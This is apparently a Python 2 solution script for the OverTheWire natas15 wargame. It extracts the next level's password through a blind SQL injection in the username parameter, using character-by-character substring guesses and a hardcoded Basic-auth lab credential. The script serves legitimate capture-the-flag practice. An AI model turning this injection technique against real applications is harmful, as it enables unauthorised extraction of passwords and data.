import requests

auth_header = {'Authorization':'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def make_url(substr):
        return "http://natas15.natas.labs.overthewire.org/index.php?debug=true&username=natas16%22%20and%20BINARY%20SUBSTRING%28password,1,%22" + str(len(substr)) + "%22%29=%22" + substr + "%22%20and%20%22a%22=%22a"

def is_success(url):
    resp = requests.get(make_url(url), headers=auth_header)
    return "This user exists." in resp.text

password = ""

while len(password) < 32:
    for char in alphanumerics:
        print password+char
        if is_success(password+char):
            password += char
            break

    print "Password =", password
